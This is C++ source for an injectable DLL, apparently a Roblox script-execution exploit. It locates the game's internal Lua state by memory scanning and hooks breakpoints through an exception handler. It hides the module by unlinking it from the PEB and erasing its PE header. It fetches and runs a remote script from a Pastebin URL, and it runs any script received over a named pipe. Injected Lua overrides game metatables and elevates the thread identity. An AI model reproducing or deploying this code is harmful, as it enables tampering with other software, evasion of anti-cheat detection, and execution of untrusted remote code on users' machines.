#include "Wrapper.h"
#include "Rlua.h"
#include "Scanner.h"
#include "Cloak.h"
#include "CustomFunctions.h"
#include "xorstring.h"
#include "mouselib.h"
using namespace std;



DWORD locateINT3() {
	DWORD _s = ScanAddress(0x400000);
	const char i3_8opcode[8] = { 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC };
	for (int i = 0; i < MAX_INT; i++)
		if (memcmp((void*)(_s + i), i3_8opcode, sizeof(i3_8opcode)) == 0)
			return (_s + i);

	return NULL;
}
DWORD locateINT31() {
	DWORD _s = ScanAddress(0x400000);
	const char i3_8opcode[8] = { 0xCC, 0xCC, 0xCC, 0xCC };
	for (int i = 0; i < MAX_INT; i++)
		if (memcmp((void*)(_s + i), i3_8opcode, sizeof(i3_8opcode)) == 0)
			return (_s + i);

	return NULL;
}

//typedef int(__cdecl* sandboxthread)(int, int*, int);
//sandboxthread SandBoxThread = (sandboxthread)ScanAddress(0x71CFD0);

void Scan() {
	//void* Old = Scanner::Hook::placeHook(ScanAddress(0x7F4CD0), GettopHook, false);
	//while (luaState == 0) Sleep(100);
	//Scanner::Hook::placeHook(ScanAddress(0x7F4CD0), Old, true);
	//rlua_settop(luaState, 0);
	printf("ff");
	uintptr_t ScriptContextVFTable = ScanAddress(0x1C40458);
	printf("ff");
	uintptr_t ScriptContext = Scanner::Memory::Scan((char*)&ScriptContextVFTable);
	printf("ff");
	luaState = *(DWORD*)(ScriptContext + 56 * 1 + 172) - (ScriptContext + 56 * 1 + 172);
	printf("ff");
	RobloxThread = rlua_newthread(luaState);
	printf("ff");
	int3breakpoint = Scanner::AOB::FindPattern("\xCC\xCC\xCC\xCC", "xxxx");
	int3breakpoint1 = Scanner::AOB::FindPattern("\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC", "xxxxxxxxxxxxxxxx");
	AddVectoredExceptionHandler(1, int3cbreakpoint);
	printf("ff");
	SetKoaxyDentity(luaState, 6);
}


DWORD WINAPI pipe1(PVOID lvpParameter)
{
	HANDLE hPipe;
	char buffer[999999];
	DWORD dwRead;
	hPipe = CreateNamedPipe(TEXT("\\\\.\\pipe\\Axon"),
		PIPE_ACCESS_DUPLEX | PIPE_TYPE_BYTE | PIPE_READMODE_BYTE,
		PIPE_WAIT,
		1,
		999999,
		999999,
		NMPWAIT_USE_DEFAULT_WAIT,
		NULL);
	while (hPipe != INVALID_HANDLE_VALUE)
	{
		if (ConnectNamedPipe(hPipe, NULL) != FALSE)
		{
			while (ReadFile(hPipe, buffer, sizeof(buffer) - 1, &dwRead, NULL) != FALSE)
			{
				buffer[dwRead] = '\0';
				ExecuteScript(buffer);
			}
		}
		DisconnectNamedPipe(hPipe);
	}
}

void Main() {
	/* Before we scan lets initilise a console.*/
	DWORD consoleOldProtect = 0;
	VirtualProtect(FreeConsole, 1, PAGE_EXECUTE_READWRITE, &consoleOldProtect);
	*(UINT*)FreeConsole = 0xC2;
	AllocConsole();
	freopen("CONOUT$", "w", stdout);
	freopen("CONIN$", "r", stdin);
	DWORD cons = (WS_CAPTION | DS_MODALFRAME | WS_MINIMIZEBOX | WS_SYSMENU);
	SetWindowLong(GetConsoleWindow(), GWL_STYLE, cons);
	SetWindowPos(GetConsoleWindow(), HWND_TOPMOST, 0, 0, 0, 0, SWP_DRAWFRAME | SWP_NOSIZE | SWP_NOMOVE | SWP_SHOWWINDOW);
	//SetConsoleTitleA("");




	//rlua_getfield(RobloxThread, -10002, "game");
	////RLUA_TUSERDATA = rlua_type(luaState, -1);
	//std::cout << "R_LUA_TUSERDATA: " << rlua_type(RobloxThread, -1) << "\n";

	//rlua_createtable(RobloxThread, 0, 0);
	////RLUA_TTABLE = rlua_type(luaState, -1);
	//std::cout << "R_LUA_TTABLE: " << rlua_type(RobloxThread, -1) << "\n";

	//rlua_getfield(RobloxThread, -10002, "print");
	////RLUA_TFUNCTION = rlua_type(luaState, -1);
	//std::cout << "R_LUA_TFUNCTION: " << rlua_type(RobloxThread, -1) << "\n";

	//rlua_pushstring(RobloxThread, "");
	////RLUA_TSTRING = rlua_type(luaState, -1);
	//std::cout << "R_LUA_TSTRING: " << rlua_type(RobloxThread, -1) << "\n";

	//rlua_pushboolean(RobloxThread, true);
	////RLUA_TBOOLEAN = rlua_type(luaState, -1);
	//std::cout << "R_LUA_TBOOLEAN: " << rlua_type(RobloxThread, -1) << "\n";

	//rlua_pushnil(RobloxThread);
	////RLUA_TNIL = rlua_type(luaState, -1);
	//std::cout << "R_LUA_TNIL: " << rlua_type(RobloxThread, -1) << "\n";

	//rlua_newthread(RobloxThread);
	////RLUA_TTHREAD = rlua_type(luaState, -1);
	//std::cout << "R_LUA_TTHREAD: " << rlua_type(RobloxThread, -1) << "\n";

	//rlua_pushnumber(RobloxThread, 0);
	////RLUA_TNUMBER = rlua_type(luaState, -1);
	//std::cout << "R_LUA_TNUMBER: " << rlua_type(RobloxThread, -1) << "\n";

	//rlua_pushlightuserdata(RobloxThread, 0);
	////RLUA_TLIGHTUSERDATA = rlua_type(luaState, -1);
	//std::cout << "R_LUA_TLIGHTUSERDATA: " << rlua_type(RobloxThread, -1) << "\n";

	//rlua_settop(RobloxThread, 0);

	printf("got types!\n");

	
	Scan();
	printf("lmao!\n");
	if (!Vanilla) {
		Vanilla = lua_open();
		luaL_openlibs(Vanilla);
		printf("lmao22!\n");
		GetGlobals();
		printf("lmao33!\n");
		OpenCustomFunctions(Vanilla);
	}
	SetThreadPointer(Vanilla, RobloxThread);
	ExecuteScript(DownloadURL("https://pastebin.com/raw/YMAL790J").c_str());
	mouse_funcs::setup(Vanilla);
	keyboard_funcs::setup(Vanilla);
	ExecuteScript(R"(


local a=debug.getmetatable(game)local b=game.IsA;local c=a.__index;local d=a.__namecall;local function e(f,g)if b(f,"DataModel")then if g=="GetObjects"then return function(h,i)return{game:GetService('InsertService'):LoadLocalAsset(i)}end end;if g=="HttpGet"then return function(h,...)if string.find(...,"getauthticket")then return"Malicious site"else return HttpGet(...)end end end; if g=="HttpGetAsync"then return function(h,...)if string.find(...,"getauthticket")then return"Malicious site"else return HttpGet(...)end end end;if g=="HttpPost"then return function(h,...)if string.find(...,"getauthticket")then return"Malicious site"else return HttpPost(h,...)end end end end end;a.__index=function(h,g)if type(g)=="string"then local j=e(h,g)if j then return j end end;return c(h,g)end;a.__namecall=function(h,...)local k={...}local l=table.remove(k)if type(l)=="string"then local j=e(h,l)if j then return j(h,unpack(k))end end;return d(h,...)end;os.execute=nil;getgenv().make_writeable=function(m)return setreadonly(m,false)end;getgenv().checkcaller=true;getgenv().hooknamecall=function(hook)hookevent("__namecall", hook)end
local Req = getrenv().require
getgenv().require = function(scr)
    --setthreadidentity(2)
    local g, res = pcall(Req, scr)
    setthreadidentity(6)

    if not g then 
        print(res) 
    end

    return res
end

getgenv().getinstances = function()
    local objs = {}
    for i,v in next,getreg() do
        if type(v)=="table" then
            for o,b in next,v do
                if typeof(b) == "Instance" then
                    table.insert(objs, b)
                end
            end
        end
    end
    return objs
end
 
getgenv().getnilinstances = function()
    local objs = {}
    for i,v in next,getreg() do
        if type(v)=="table" then
            for o,b in next,v do
                if typeof(b) == "Instance" and b.Parent==nil then
                    table.insert(objs, b)
                end
            end
        end
    end
    return objs
end

getgenv().loadfile = function(path)
    local filecontents, err = readfile(path)
    if (not filecontents) then
        return filecontents, err
    end
 
    return loadstring(filecontents)
end

)");
	printf("hi");

	//AutoExecute(); // k bye
	CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)pipe1, NULL, NULL, NULL);
	//Scanner::ClipBoard::Set("Done");
	//MessageBox(0, "Injected!", "Skisploit", MB_TOPMOST);
	printf("Injected! \n");
	/*while (true)
	{
		string e;
		std::getline(std::cin, e);
		ExecuteScript(e.c_str());

	}*/

}

BOOL WINAPI DllMain(HINSTANCE hInstance, DWORD fdwReason, LPVOID lpvReserved) {
	if (fdwReason) {
		DisableThreadLibraryCalls(hInstance);
		UnlinkModuleFromPEB(hInstance);
		CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)erase_peheader, NULL, NULL, NULL);
		CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)Main, NULL, NULL, NULL);
	}
	return true;
}